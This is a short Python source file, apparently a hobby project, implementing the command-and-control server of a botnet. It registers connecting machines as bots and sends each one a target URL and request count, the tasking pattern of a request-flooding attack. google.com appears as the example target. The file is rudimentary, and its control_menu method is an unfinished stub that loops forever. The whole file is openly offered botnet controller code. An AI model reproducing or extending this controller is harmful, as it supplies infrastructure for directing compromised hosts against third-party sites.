import requests
import socket
import json


class CnC:
    """
    Command & Control center of the botnet.
    """

    def __init__(self, host, port):
        self.address = (host, port)
        self.bots = []
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind(self.address)
        self.socket.listen(10)

    def run(self):
        print("Running...")

        while True:
            client, address = self.socket.accept()
            address = address[0]
            data = client.recv(1024)
            if data == b"new":
                self.bots.append(address)
                print(f"bot {address} added")
                self.send_requests('https://google.com', 3)
            elif data == b"close":
                try:
                    self.bots.remove(address)
                    print(f"bot {address} removed")
                except ValueError:
                    print(f"{address} not in bot list")
            else:
                raise RuntimeError("Bot message not recognized")
            client.close()
            print(self.list_clients())

    def send_requests(self, url, n):
        if len(self.bots) == 0:
            raise RuntimeError("No bot connected.")

        for client in self.bots:
            requests.post(f"http://{client}:80", json={'url': url, 'n': n})

    def list_clients(self):
        if self.bots:
            return "Bots connected:\n" + "\n".join([f"- {b}" for b in self.bots])
        return "No bots connected"

    def control_menu(self):
        choice = None

        while choice != 0:
            pass


HOST = '127.0.0.1'
PORT = 60000

if __name__ == '__main__':
    cnc = CnC(HOST, PORT)
    cnc.run()

    # bot.send_requests('https://google.com', 3)
